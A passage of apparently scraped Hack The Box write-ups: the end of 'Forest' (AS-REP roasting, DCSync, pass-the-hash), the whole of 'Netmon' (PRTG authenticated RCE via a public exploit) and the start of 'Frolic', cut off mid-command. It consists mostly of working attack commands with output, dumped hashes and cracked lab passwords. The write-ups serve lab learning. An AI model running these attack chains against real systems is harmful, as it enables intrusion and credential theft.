\u0026#39;$krb5asrep$23$svc-alfresco@HTB.LOCAL:d90ded029bb968322842c61524dba44c$b826f6094adadef8674b55fc44f5fce9b0297439b3d501fb1906ae4efe90943d7e63418c54c6d449deabe7990ff404f33449593977a0ed21f81b44ebd5893f58fa42073485e464d123928e62f1f46c7b314a54780b2040bbea1ad53bccb99d59d730f2eb95102e3b62d1b95cec5249f62ae8c14e04130e9551cff3a94e5fb54caf758746c76be39453504f86ef2f468ed77fa6090d958cf81c88efb7c5bd8f00f1ba978537f8177e385167c35751ad38fa7d1717674446b8d0142c2e1aa275542a31b93a6eb5660aeffb5b26ea75685fcfee74053bdf346d55101c2d6c3e58fe50b375f73e35\u0026#39; \u0026gt; hash $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status s3rvice ($krb5asrep$23$svc-alfresco@HTB.LOCAL) 1g 0:00:00:05 DONE 0.1945g/s 794894p/s 794894c/s 794894C/s s4553592..s3r2s1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed Now that we have valid credentials, we can try to see if there are any \u0026ldquo;kerberoastable\u0026rdquo; users:\n$ GetUserSPNs.py htb.local/svc-alfresco:s3rvice Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation No entries found! And there are not. Then, we can check if we have remote management permissions using crackmapexec:\n$ crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice WINRM 10.10.10.161 5985 FOREST [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local) WINRM 10.10.10.161 5985 FOREST [*] http://10.10.10.161:5985/wsman WINRM 10.10.10.161 5985 FOREST [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!) And thus, we can access to the machine using evil-winrm:\n$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; whoami htb\\svc-alfresco *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; type C:\\Users\\svc-alfresco\\Desktop\\user.txt e5e4e47ae7022664cda6eb013fb0d9ed Domain enumeration In order to compromise the DC, we can make use of BloodHound and see potential attack vectors for that purpose. Hence, we need to upload SharpHound.ps1 to the machine and execute Invoke-BloodHound -CollectionNames All to obtain a ZIP file for BloodHound (the command was added at the end of the PowerShell script):\n$ wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 $ echo \u0026#39;Invoke-BloodHound -CollectionNames All\u0026#39; \u0026gt;\u0026gt; SharpHound.ps1 The evil-winrm session allows to transfer files in an easy way:\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; cd C:\\Windows\\Temp *Evil-WinRM* PS C:\\Windows\\Temp\u0026gt; mkdir privesc *Evil-WinRM* PS C:\\Windows\\Temp\u0026gt; cd privesc *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; upload SharpHound.ps1 Info: Uploading SharpHound.ps1 to C:\\Windows\\Temp\\privesc\\SharpHound.ps1 Data: 1299032 bytes of 1299032 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; .\\SharpHound.ps1 *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; dir  Directory: C:\\Windows\\Temp\\privesc Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 7/24/2021 5:49 AM 15541 20210724054945_BloodHound.zip -a---- 7/24/2021 5:49 AM 23611 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin -a---- 7/24/2021 5:49 AM 974276 SharpHound.ps1 *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; download 20210724054945_BloodHound.zip Info: Downloading C:\\Windows\\Temp\\privesc\\20210724054945_BloodHound.zip to 20210724054945_BloodHound.zip Info: Download successful! Once imported the ZIP file into BloodHound, we see the following graph and the shortest path to become domain administrator:\nPrivilege escalation BloodHound tells us that user svc-alfresco is able to add domain users because it is member of Account Operators (and also member of Privileged IT Accounts and Service Accounts). To get Administrator privileges we need to belong to group Exchange Windows Permissions.\nFirst, we create a domain user:\n*Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; net user rocky 7rocky7rocky /add /domain The command completed successfully. Next, we add this new user to Exchange Windows Permissions group:\n*Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; net group \u0026#34;Exchange Windows Permissions\u0026#34; rocky /add The command completed successfully. Now that we have a valid user belonging to Exchange Windows Permissions group, we have the permissions to modify the DACL (Directory Access Control List) of the htb.local domain (shown in BloodHound as WriteDacl). Basically, we can grant any privilege we want to the new user rocky. BloodHound provides a list of commands to execute this task (we need to download PowerView.ps1 to the machine):\n*Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; upload PowerView.ps1 Info: Uploading PowerView.ps1 to C:\\Windows\\Temp\\privesc\\PowerView.ps1 Data: 770279 bytes of 770279 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; .\\PowerView.ps1 *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; $SecPassword = ConvertTo-SecureString \u0026#39;7rocky7rocky\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;htb.local\\rocky\u0026#39;, $SecPassword) *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026#34;DC=htb,DC=local\u0026#34; -PrincipalIdentity rocky -Rights DCSync Now, we are able to perform a DCSync attack with Mimikatz or Impacket secretsdump.py to extract all the NTLM hashes of the domain users (stored in the NTDS.dit file).\nUsing secretsdump.py, we can obtain the NTLM hash of Administrator:\n$ secretsdump.py htb.local/rocky:7rocky7rocky@10.10.10.161 Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ^C[-] Delete resume session file? [y/N] y [*] Cleaning up... Pass the Hash to Administrator Finally, we are able to Pass the Hash with pth-winexe (among other tools) and gain access to a command line interface as Administrator:\n$ pth-winexe -U htb.local/Administrator%aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 //10.10.10.161 cmd.exe E_md4hash wrapper called. HASH PASS: Substituting user supplied NTLM HASH... Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt f048153f202bbb2f82622b04d79129cc ","image":"/images/HTB/Forest/Forest.png","permalink":"https://7rocky.github.io/en/htb/forest/","section":"htb","summary":"Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment to perform MS RPC enumeration, AS-REProasting, password decrypting, DCSync and Pass the Hash. Basic AD enumeration and exploitation skills, as well as BloodHound knowledge, are needed to compromise this machine","time":7,"title":"Forest"},{"contents":"  OS: Windows   Difficulty: Easy   IP Address: 10.10.10.152   Release: 02 / 03 / 2019   Port scanning # Nmap 7.92 scan as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.150 -p 21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 Nmap scan report for 10.10.10.150 Host is up. PORT STATE SERVICE VERSION 21/tcp filtered ftp 80/tcp filtered http 135/tcp filtered msrpc 139/tcp filtered netbios-ssn 445/tcp filtered microsoft-ds 5985/tcp filtered wsman 47001/tcp filtered winrm 49664/tcp filtered unknown 49665/tcp filtered unknown 49666/tcp filtered unknown 49667/tcp filtered unknown 49668/tcp filtered unknown 49669/tcp filtered unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 7.31 seconds  This machine has ports 21 (FTP), 80 (HTTP), 135 (MS-RPC), 139, 445 (SMB) and 5985 (WinRM) filtered, within others.\n$ crackmapexec smb 10.10.10.152 SMB 10.10.10.152 445 NETMON [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)  Web enumeration We can start going to http://10.10.10.152 and see a website for PRTG Network Monitor:\nHere we can try the default credentials (prtgadmin:prtgadmin), but the do not work.\nWe can search for vulnerabilities and exploits and find out that we can execute commands as system on the machine as log as we are authenticated:\n$ searchsploit PRTG ------------------------------------------------------------------------- --------------------------- Exploit Title | Path ------------------------------------------------------------------------- --------------------------- PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution | windows/webapps/46527.sh PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS | windows/webapps/49156.txt PRTG Network Monitor \u0026lt; 18.1.39.1648 - Stack Overflow (Denial of Service) | windows_x86/dos/44500.py PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting | java/webapps/34108.txt ------------------------------------------------------------------------- --------------------------- Shellcodes: No Results  Since the version we have is PRTG Network Monitor 18.1.37.13946, it might be vulnerable. Hence, we need to find valid credentials.\nFTP enumeration Let\u0026rsquo;s try to connect to the FTP server using an anonymous session:\n$ ftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:rocky): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in.  And we are connected. At this point, we can find the user.txt flag in C:\\Users\\Public:\nftp\u0026gt; dir 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) 07-17-22 09:14PM \u0026lt;DIR\u0026gt; Users 02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows 226 Transfer complete. ftp\u0026gt; dir Users 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM \u0026lt;DIR\u0026gt; Administrator 07-17-22 09:13PM \u0026lt;DIR\u0026gt; Public 226 Transfer complete. ftp\u0026gt; dir Users\\Public 200 PORT command successful. 550 The system cannot find the file specified. ftp\u0026gt; dir Users/Public 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM \u0026lt;DIR\u0026gt; Documents 07-16-16 09:18AM \u0026lt;DIR\u0026gt; Downloads 07-16-16 09:18AM \u0026lt;DIR\u0026gt; Music 07-16-16 09:18AM \u0026lt;DIR\u0026gt; Pictures 07-17-22 02:23PM 34 user.txt 07-16-16 09:18AM \u0026lt;DIR\u0026gt; Videos 226 Transfer complete. ftp\u0026gt; cd Users/Public 250 CWD command successful. ftp\u0026gt; get user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 34 bytes received in 0,158 seconds (215 bytes/s) ftp\u0026gt; quit $ catn user.txt e8627c9bb6e4f87b3eb908adb1ff58dd  According to www.paessler.com, the credentials for PRTG Network Monitor are stored in C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.old.\nAltough we don\u0026rsquo;t see C:\\ProgramData in FTP, we are still able to go to this folder and list configuration files:\n$ ftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:rocky): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. ftp\u0026gt; dir 200 PORT command successful. 150 Opening ASCII mode data connection. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) 02-03-19 08:08AM \u0026lt;DIR\u0026gt; Users 02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows 226 Transfer complete. ftp\u0026gt; cd ProgramData 250 CWD command successful. ftp\u0026gt; cd Paessler 250 CWD command successful. ftp\u0026gt; dir 200 PORT command successful. 150 Opening ASCII mode data connection. 07-17-22 08:41PM \u0026lt;DIR\u0026gt; PRTG Network Monitor 226 Transfer complete. ftp\u0026gt; cd PRTG\\ Network\\ Monitor 250 CWD command successful. ftp\u0026gt; dir 200 PORT command successful. 150 Opening ASCII mode data connection. 12-15-21 08:23AM \u0026lt;DIR\u0026gt; Configuration Auto-Backups 07-17-22 08:00PM \u0026lt;DIR\u0026gt; Log Database 02-03-19 12:18AM \u0026lt;DIR\u0026gt; Logs (Debug) 02-03-19 12:18AM \u0026lt;DIR\u0026gt; Logs (Sensors) 02-03-19 12:18AM \u0026lt;DIR\u0026gt; Logs (System) 07-17-22 02:24PM \u0026lt;DIR\u0026gt; Logs (Web Server) 07-17-22 08:04PM \u0026lt;DIR\u0026gt; Monitoring Database 02-25-19 10:54PM 1189697 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 07-17-22 08:41PM 1724089 PRTG Graph Data Cache.dat 02-25-19 11:00PM \u0026lt;DIR\u0026gt; Report PDFs 02-03-19 12:18AM \u0026lt;DIR\u0026gt; System Information Database 02-03-19 12:40AM \u0026lt;DIR\u0026gt; Ticket Database 02-03-19 12:18AM \u0026lt;DIR\u0026gt; ToDo Database 226 Transfer complete.  At this point, let\u0026rsquo;s download all configuration files. We can search for \u0026quot;password\u0026quot; in all of them and find a hard-coded one in a comment in PRTG Configuration.old.bak:\n$ grep -A 2 dbpassword PRTG\\ Configuration.old.bak | head \u0026lt;dbpassword\u0026gt; \u0026lt;!-- User: prtgadmin --\u0026gt; PrTg@dmin2018 \u0026lt;/dbpassword\u0026gt; \u0026lt;dbtimeout\u0026gt; 60 -- \u0026lt;dbpassword\u0026gt; \u0026lt;flags\u0026gt; \u0026lt;inherited/\u0026gt;  Privilege escalation If we try prtgadmin:PrTg@dmin2018 it does not work. However, we can think that the password was updated and guess it is now PrTg@dmin2019, PrTg@dmin2020, etc. Actually, it works for PrTg@dmin2019. Now we are authenticated:\nAt this point, we can use the exploit found earlier: (46527.sh). We will need to take the cookies from the browser and pass them to the script:\n$ bash 46527.sh -u http://10.10.10.152 -c \"_ga=GA1.4.68336878.1658105273; _gid=GA1.4.1335940588.1658105273; OCTOPUS1813713946=e0YwNkU0RUZGLUQyQkUtNDAyMi1CMEY5LUM3QURENkVEODlEMn0%3D; _gat=1\" [+]#########################################################################[+] [*] Authenticated PRTG network Monitor remote code execution [*] [+]#########################################################################[+] [*] Date: 11/03/2019 [*] [+]#########################################################################[+] [*] Author: https://github.com/M4LV0 lorn3m4lvo@protonmail.com [*] [+]#########################################################################[+] [*] Vendor Homepage: https://www.paessler.com/prtg [*] [*] Version: 18.2.38 [*] [*] CVE: CVE-2018-9276 [*] [*] Reference: https://www.codewatch.org/blog/?p=453 [*] [+]#########################################################################[+] # login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script. # run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' [+]#########################################################################[+] [*] file created [*] sending notification wait.... [*] adding a new user 'pentest' with password 'P3nT3st' [*] sending notification wait.... [*] adding a user pentest to the administrators group [*] sending notification wait.... [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!  This exploit creates a user called pentest with password P3nT3st! and adds it to the Administrators group. Hence, we can check that indeed we have elevated privileges with crackmapexec:\n$ crackmapexec smb 10.10.10.152 -u pentest -p P3nT3st! SMB 10.10.10.152 445 NETMON [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True) SMB 10.10.10.152 445 NETMON [+] netmon\\pentest:P3nT3st! (Pwn3d!)  Since we see Pwn3d! then we can connect to the machine and read the root.txt flag using evil-winrm:\n$ evil-winrm -i 10.10.10.152 -u pentest -p P3nT3st! Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM*PS C:\\Users\\pentest\\Documents\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt 0523e6a565d4df9901fff01ef2a9b75f  ","image":"/images/HTB/Netmon/Netmon.png","permalink":"https://7rocky.github.io/en/htb/netmon/","section":"htb","summary":"Hack The Box. Windows. Easy machine. This machine presents an instance of PRTG Network Monitor which is vulnerable to RCE as system. We can connect to FTP with anonymous credentials and read the backup for a configuration file for PRTG Network Monitor and get an old password, which provides a format to guess the current password. Then we can run the public exploit to get RCE and become Administrator","time":6,"title":"Netmon"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.10.111   Release: 13 / 10 / 2018   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.111 -p 22,139,445,1880,9999 Nmap scan report for 10.10.10.111 Host is up (0.074s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA) | 256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA) |_ 256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 1880/tcp open http Node.js (Express middleware) |_http-title: Node-RED 9999/tcp open http nginx 1.10.3 (Ubuntu) |_http-title: Welcome to nginx! |_http-server-header: nginx/1.10.3 (Ubuntu) Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required |_clock-skew: mean: -1h49m59s, deviation: 3h10m31s, median: 0s | smb2-time: | date: 2022-07-17T16:54:51 |_ start_date: N/A | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: frolic | NetBIOS computer name: FROLIC\\x00 | Domain name: \\x00 | FQDN: frolic |_ System time: 2022-07-17T22:24:51+05:30 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: FROLIC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 16.23 seconds  This machine has ports 22 (SSH), 139, 445 (SMB), 1880 and 9999 (HTTP) open.\nWeb enumeration If we go to http://10.10.10.111:1880 we will see a Node-RED instance:\nWe can try using default credentials (NR_account:NodeRed#123), but they don\u0026rsquo;t work.\nIn http://10.10.10.111:9999 we can see a default page for nginx:\nLet\u0026rsquo;s apply fuzzing using ffuf to enumerate more routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/FUZZ admin [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 78ms] test [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 40ms] dev [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 127ms] backup [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 43ms] loop [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 43ms] [Status: 200, Size: 637, Words: 79, Lines: 29, Duration: 52ms]  If we go to /test, we will see a phpinfo:\nIn /backup we have two files and a loop directory:\n$ curl 10.10.10.111:9999/backup/ password.txt user.txt loop/ $ curl 10.10.10.111:9999/backup/loop/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body bgcolor=\"white\"\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;403 Forbidden\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.10.3 (Ubuntu)\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ curl 10.10.10.111:9999/backup/user.txt user - admin $ curl 10.10.10.111:9999/backup/password.txt password - imnothuman  We are not allowed to enter in loop, but maybe those credentials are needed later.\nIn /admin we have a login form:\nIf we try random credentials, we will se an alert:\nThis is a sign that the authentication is probably handled by JavaScript, so let\u0026rsquo;s read the source code:\nSo the JavaScript file is /admin/js/login.js. Let\u0026rsquo;s analyze it:\n$ curl http://10.10.10.111:9999/admin/js/login.js  varattempt=3; // Variable to count number of attempts. // Below function Executes on click of login button. functionvalidate(){ varusername=document.getElementById(\"username\").value; varpassword=document.getElementById(\"password\").value; if( username==\"admin\"\u0026amp;\u0026amp;password==\"superduperlooperpassword_lol\"){  alert(\"Login successfully\"); window.location=\"success.html\"; // Redirecting to other page. returnfalse; } else{ attempt--;// Decrementing by one. alert(\"You have left \"+attempt+\" attempt;\"); // Disabling fields after 3 attempts. if( attempt==0){ document.getElementById(\"username\").disabled =true; document.getElementById(\"password\").disabled =true; document.getElementById(\"submit\").disabled =true; returnfalse; } } }  Alright, we have a password (superduperlooperpassword_lol) and also the file where we will go if authentication is successful. So we can access directly:\n$ curl 10.10.10.111:9999/admin/success.htmlhat\u0026rsquo;s this? It looks like an esoteric language (something similar to Brainfuck). If we do a bit of research, we will discover that it is \u0026ldquo;Ook!\u0026rdquo;, so let\u0026rsquo;s decode it in www.dcode.fr:\nAs it says, let\u0026rsquo;s go to /asdiSIAJJ0QWE9JAS:\n$ curl 10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA  It looks like some data encoded in Base64. If we decode it, we will see magic bytes PK, so it is going to be a ZIP archive:\n$ curl 10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ -s | base64 -d PK É7M#[i index.phpUT |[|[ux ^DJsh) $ curl 10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ -s | base64 -d | xxd 00000000: 504b 0304 1400 0900 0800 c389 374d 23fe PK..........7M#. 00000010: 5b14 b000 0000 6902 0000 0900 1c00 696e [.....i.......in 00000020: 6465 782e 7068 7055 5409 0003 857c a75b dex.phpUT....|.[ 00000030: 857c a75b 7578 0b00 0104 0000 0000 0400 .|.[ux.......... 00000040: 0000 005e 44e6 104a 9f73 b268 8a29 9a1b ...^D..J.s.h.).. 00000050: 9550 f06e 0ba9 bf53 73e4 024a 771a 11dc .P.n...Ss..Jw... 00000060: 8ee5 a034 e2f6 d98f 6bee 7ad0 128a 55c8 ...4....k.z...U. 00000070: 96ec 2b58 ba7f e050 c8e1 12e1 b687 a4ea ..+X...P........ 00000080: d0bb e278 5f13 c04e 895b fd8d 8453 aaea ...x_..N.[...S.. 00000090: 38f2 83f2 e20f 914a 3253 c72a 8303 44d0 8......J2S.*..D. 000000a0: 8d7d 9338 6454 0e51 026b de10 cad7 e3e4 .}.8dT.Q.k...... 000000b0: fb6a 5f9f 8bf9 18e9 94c0 2778 7f63 90c2 .j_.......'x.c.. 000000c0: 16dd 8f74 beb2 3735 51ac 0b9a 8a03 0e95 ...t..75Q....... 000000d0: 106b 032c 34b5 d962 29be 3446 b5e9 0609 .k.,4..b).4F.... 000000e0: ffba 84e3 96ea e9ef c726 7132 6f88 57d4 .........\u0026q2o.W. 000000f0: 9ce3 3950 4b07 0823 fe5b 14b0 0000 0069 ..9PK..#.[.....i 00000100: 0200 0050 4b01 021e 0314 0009 0008 00c3 ...PK........... 00000110: 8937 4d23 fe5b 14b0 0000 0069 0200 0009 .7M#.[.....i.... 00000120: 0018 0000 0000 0001 0000 00a4 8100 0000 ................ 00000130: 0069 6e64 6578 2e70 6870 5554 0500 0385 .index.phpUT.... 00000140: 7ca7 5b75 780b 0001 0400 0000 0004 0000 |.[ux........... 00000150: 0000 504b 0506 0000 0000 0100 0100 4f00 ..PK..........O. 00000160: 0000 0301 0000 0000 ........  And indeed, it is:\n$ curl 10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ -s | base64 -d \u0026gt; file.zip $ file file.zip file.zip: Zip archive data, at least v2.0 to extract, compression method=deflate  Let\u0026rsquo;s see what\u0026rsquo;s inside and extract it:\n$ unzip -l file.zip Archive: file.zip Length Date Time Name --------- ---------- ----- ---- 617 09-23-2018 13:44 index.php --------- ------- 617 1 file $ unzip file.zip Archive: file.zip [file.zip] index.php password:  Alright, it is protected with password. Let\u0026rsquo;s use fcrackzip to test passwords from rockyou.txt:\n$ fcrackzip -uDp $WORDLISTS/rockyou.txt file.zip PASSWORD FOUND!!!!: pw == password $ unzip file.zip Archive: file.zip [file.zip] index.php password: inflating: index.php  So we found the password and extracted index.php. In this file we have data encoded in hexadecimal, let\u0026rsquo;s decode it:\n$ cat index.php 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a $ cat index.php | xxd -r -p KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==  Now it seems to be a string encoded in Base64:\n$ cat index.php | xxd -r -p | base64 -d +++++ +++++ [-\u0026gt;++ +++++ +++\u0026lt;] \u0026gt;++++ +.--- --.++ +++++ .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ ++.\u0026lt;+ ++[-\u0026gt; ---\u0026lt;] \u0026gt;---- --.-- ----- .\u0026lt;+++ +[-\u0026gt;+ +++\u0026lt;] \u0026gt;+++. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ .---. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- ----. \u0026lt;++++ [-\u0026gt;++ ++\u0026lt;]\u0026gt; ++..\u0026lt;  And this is another esoteric langage: Brainfuck. We can go again to www.dcode.fr and decode it:\nIt shows another password: idkwhatispass.\nContinuing with web enumeration, we are not allowed to access /dev:\n$ curl 10.10.10.111:9999/dev/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body bgcolor=\"white\"\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;403 Forbidden\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.10.3 (Ubuntu)\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  But let\u0026rsquo;s fuzz for more files and directories:\n$ ffuf 